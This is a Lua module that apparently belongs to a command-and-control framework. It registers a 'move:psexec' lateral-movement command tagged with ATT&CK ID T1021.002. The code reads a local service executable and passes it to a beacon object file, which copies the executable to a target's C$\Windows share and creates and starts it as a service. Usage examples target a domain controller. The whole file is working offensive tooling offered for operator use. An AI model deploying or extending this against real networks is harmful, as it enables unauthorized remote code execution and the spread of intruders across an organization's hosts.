local function bof_path(bof_name, arch)
    return "bof/move/" .. bof_name .. "/" .. bof_name .. "." .. arch .. ".o"
end
-- psexec
local function run_psexec(args, cmd)
    local host = ""
    local svc_name = ""
    local svc_path = ""

    -- Check if using positional arguments first
    if args and #args == 3 then
        -- Positional argument format: ps_exec host service_name local_path
        host = args[1]
        svc_name = args[2]
        svc_path = args[3]
    else
        -- Flag format: ps_exec --host host --service service --path path
        host = cmd:Flags():GetString("host")
        svc_name = cmd:Flags():GetString("service")
        svc_path = cmd:Flags():GetString("path")
    end

    -- Validate required parameters
    if host == "" then
        error("host is required")
    end
    if svc_name == "" then
        error("service name is required")
    end
    if svc_path == "" then
        error("local path to service executable is required")
    end

    -- Read the service binary file
    local svc_binary = read(svc_path)
    if svc_binary == nil or #svc_binary == 0 then
        error("Service executable not found or is empty: " .. svc_path)
    end

    -- Construct remote path
    local remote_path = "\\\\" .. host .. "\\C$\\Windows\\" .. svc_name .. ".exe"

    -- Pack arguments: host, service_name, binary_data, remote_path
    local packed_args = bof_pack("zzbz", host, svc_name, svc_binary, remote_path)

    local session = active()
    local arch = session.Os.Arch
    local bof_file = bof_path("psexec", arch)

    return bof(session, script_resource(bof_file), packed_args, true)
end

local cmd_ps_exec = command("move:psexec", run_psexec, "Execute service on target host using psexec <host> <service_name> <local_path>", "T1021.002")
cmd_ps_exec:Flags():String("host", "", "target host")
cmd_ps_exec:Flags():String("service", "", "service name")
cmd_ps_exec:Flags():String("path", "", "local path to service executable")
opsec("move:psexec", 9.0)

help("move:psexec", [[
Positional arguments format:
  move psexec DOMAIN-DC AgentSvc /tmp/MyAgentSvc.exe
  move psexec 192.168.1.100 TestService C:\tools\service.exe

Flag format:
  move psexec --host DOMAIN-DC --service AgentSvc --path /tmp/MyAgentSvc.exe
  move psexec --host 192.168.1.100 --service TestService --path C:\tools\service.exe

Note:
- Requires administrator privileges on target host
- Service executable will be copied to C:\Windows\ on target
- Service will be created and started automatically
]])